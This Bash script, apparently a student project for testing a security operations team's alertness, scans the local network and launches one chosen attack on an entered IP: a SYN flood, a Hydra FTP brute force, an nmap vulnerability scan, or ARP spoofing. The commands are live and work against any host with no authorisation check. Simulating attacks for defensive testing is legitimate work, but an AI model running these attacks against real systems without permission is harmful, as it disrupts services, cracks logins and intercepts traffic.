#!/bin/bash

RED="\033[1;31m"
GREEN="\033[1;32m"
DARK_YELLOW="\033[0;33m"
BLUE="\033[1;34m"
NC="\033[0m"



#Student name : Afek Tzabari
#Student code : s16
#Unit : TMagen773634
#Lecturer : Natalie Erez

# installing toilet
sudo apt-get install toilet -y > /dev/null 2>&1
sleep 0.5
toilet -f small "SOC CHECKER"
sleep 0.5
toilet -f small -F metal -w 200 --filter border "By: Afek Tzabari"
sleep 0.5
echo "========================================="
echo "Description:"
echo "• Simulate attacks to test SOC team alertness."
echo "• Let user choose type of attack and target."
echo "• Log attack type, target, and time."
echo "• Easy to use for SOC managers."
echo "========================================="
echo ""
sleep 1

USER=$(whoami)
LOG_FILE="/var/log/soc_checker.log"
SAVE_DIR="/home/$USER/Desktop/SOC_Attack_Logs"
mkdir -p "$SAVE_DIR"
AVAILABLE_IPS=( )



echo "===== STEP 1: Network Discovery ====="
sleep 0.7

#A function that displayes all the ips in the network
function find_ips() {
    echo -e "${BLUE}[+] Scanning the network for live hosts...${NC}"
    sleep 0.7
    local ranges=()
    mapfile -t ranges < <(ip -4 a | grep inet | grep -v 127 | awk '{print $2}')
    for range in "${ranges[@]}"; do
        base_ip="${range%.*}.0/24"
        mapfile -t scan_ips < <(nmap -sn "$base_ip" | awk '/Nmap scan report/ {print $5}')
        AVAILABLE_IPS+=("${scan_ips[@]}")
    done
    if [ ${#AVAILABLE_IPS[@]} -eq 0 ]; then
        echo -e "${RED}[-] No live hosts found.${NC}"
        exit 1
    fi
    echo -e "${GREEN}[+] Found IPs:${NC} ${AVAILABLE_IPS[*]}"
    sleep 1
}
find_ips

echo ""
echo "===== STEP 2: Attack Selection ====="
sleep 0.7

#A function that shows the user the types of the attacks 
function show_attacks() {
    echo -e "${BLUE}Available Attacks:${NC}"
    echo "1) SYN Flood (hping3)"
    echo "2) FTP Bruteforce (Hydra)"
    echo "3) Nmap with NSE (OS + Vuln Detection)"
    echo "4) ARP Spoofing (arpspoof)"
    sleep 0.5
}

#A function that lets the user to choose a type of attack 
function select_attack() {
    show_attacks
    echo ""
    read -p "[~] Choose an attack [1-4] or type 'random': " choice
    sleep 0.5

    if [[ "$choice" == "random" ]]; then
        choice=$((1 + RANDOM % 4))
    fi

    case "$choice" in
        1) attack_syn_flood ;;
        2) attack_ftp_bruteforce ;;
        3) attack_os_scan ;;
        4) attack_arpspoof ;;
        *) echo -e "${RED}[X] Invalid input. Exiting.${NC}"; exit 1 ;;
    esac
}

# A function that creats a log file 
function log_attack() {
    local attack_name="$1"
    local target_ip="$2"
    echo "[$(date)] Attack: $attack_name | Target: $target_ip" | sudo tee -a "$LOG_FILE" > /dev/null
    sleep 0.5
}


# attack number 1 this function is using hping3 to do SYN flood 
function attack_syn_flood() {
    echo -e "${DARK_YELLOW}[*] SYN Flood Description:${NC} Sends SYN packets using hping3 for 10 seconds."
    sleep 0.7
    read -p "[~] Enter target IP for SYN flood: " target
    if [[ -z "$target" ]]; then echo -e "${RED}[X] No IP provided. Exiting.${NC}"; exit 1; fi
    touch "/home/$USER/Desktop/SOC_Attack_Logs/syn_flood_$target.txt"
	echo "[+] SYN flood launched on $target for 10 seconds." > "/home/$USER/Desktop/SOC_Attack_Logs/syn_flood_$target.txt"
	timeout 10s sudo hping3 -S -p 80 --flood "$target" > /dev/null 2>&1
    log_attack "SYN Flood" "$target"
    echo -e "${GREEN}[+] SYN Flood completed on $target${NC}"
    sleep 1
}

#attack number 2 FTP bruteforce also letting the user to use custom users and passwords
function attack_ftp_bruteforce() {
    echo -e "${DARK_YELLOW}[*] FTP Bruteforce Description:${NC} Attempt login using Hydra."
    sleep 0.7
    read -p "[~] Enter target IP for FTP: " target
    if [[ -z "$target" ]]; then echo -e "${RED}[X] No IP provided. Exiting.${NC}"; exit 1; fi

    read -p "[~] Enter path to username list (leave blank for default): " userlist
    if [[ -z "$userlist" ]]; then
        userlist="/home/$USER/Desktop/common_users.txt"
        echo -e "admin\nuser\ntest\nguest\nftp\nsupport\nroot\ndeveloper\nbackup\ninfo" > "$userlist"
        echo -e "${DARK_YELLOW}[!] No username list provided. Using 10 common usernames.${NC}"
    elif [[ ! -f "$userlist" ]]; then
        echo -e "${RED}[X] Username list not found. Exiting.${NC}"
        exit 1
    fi

    read -p "[~] Enter path to password list (leave blank for default rockyou): " passlist
    if [[ -z "$passlist" ]]; then
        passlist="/usr/share/wordlists/rockyou.txt"
        echo -e "${DARK_YELLOW}[!] No password list provided. Using rockyou.txt.${NC}"
    elif [[ ! -f "$passlist" ]]; then
        echo -e "${RED}[X] Password list not found. Exiting.${NC}"
        exit 1
    fi

    echo -e "${GREEN}[+] Starting Hydra brute force...${NC}"
    sleep 0.7
    hydra -L "$userlist" -P "$passlist" ftp://$target -o "/home/$USER/Desktop/SOC_Attack_Logs/hydra_ftp_$target.txt"
    log_attack "FTP Bruteforce" "$target"
    echo -e "${GREEN}[+] FTP Bruteforce attempted on $target${NC}"
    echo -e "${GREEN}[+] Also saved in SOC_Attack_Logs. ${NC}"
    sleep 1
}

#attack number 3 nmap with NSE 
function attack_os_scan() {
    echo -e "${DARK_YELLOW}[*] Nmap with NSE Description:${NC} Run OS scan with Nmap plus vulnerability NSE scripts."
    sleep 0.7
    read -p "[~] Enter target IP for Nmap scan: " target
    if [[ -z "$target" ]]; then echo -e "${RED}[X] No IP provided. Exiting.${NC}"; exit 1; fi
    echo -e "${GREEN}[+] Starting enhanced Nmap scan...${NC}"
    sleep 0.7
    nmap -O -sV --script vuln "$target" -oN "/home/$USER/Desktop/SOC_Attack_Logs/nmap_nse_scan_$target.txt"
    log_attack "Nmap NSE Scan" "$target"
    echo -e "${GREEN}[+] Nmap NSE scan completed on $target${NC}"
    echo -e "${GREEN}[+] Also saved in SOC_Attack_Logs. ${NC}"
    sleep 1
}

#attack number 4 arpsoof 
function attack_arpspoof() {
    echo -e "${DARK_YELLOW}[*] ARP Spoof Description:${NC} Redirect packets between two hosts."
    sleep 0.7
    read -p "[~] Enter target IP (victim): " target
    read -p "[~] Enter gateway IP: " gateway
    if [[ -z "$target" || -z "$gateway" ]]; then echo -e "${RED}[X] Both IPs are required. Exiting.${NC}"; exit 1; fi
    echo -e "${GREEN}[+] Launching arpspoof for 15 seconds...${NC}"
    sleep 0.7
    sudo arpspoof -t "$target" "$gateway" > "/home/$USER/Desktop/SOC_Attack_Logs/arpspoof_$target.txt" 2>&1 &
    PID=$!
    sleep 15
    kill "$PID"
    log_attack "ARP Spoof" "$target"
    echo -e "${GREEN}[+] ARP Spoof completed on $target${NC}"
    echo -e "${GREEN}[+] Also saved in SOC_Attack_Logs. {NC}"
    sleep 1
}


#after finishing saving everything inside a folder also in the /var/log
select_attack

echo ""
sleep 1
echo -e "${GREEN}[✓] Attack completed and logged to $LOG_FILE${NC}"
sleep 0.5
echo -e "${GREEN}[:)] DONE. Cya next time! ${NC}"
